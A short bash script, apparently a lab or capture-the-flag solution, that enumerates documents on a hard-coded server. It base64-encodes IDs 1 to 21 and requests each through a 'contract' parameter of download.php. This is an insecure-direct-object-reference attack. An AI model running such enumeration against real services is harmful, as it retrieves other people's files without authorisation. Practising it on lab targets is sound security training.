#!/bin/bash

for i in {1..21}; do
    for hash in $(echo -n $i | base64 -w 0 | tr -d ' -'); do
        curl --trace-ascii - -O -G --data-urlencode "contract=$hash" http://83.136.252.13:54596/download.php?
    done
done
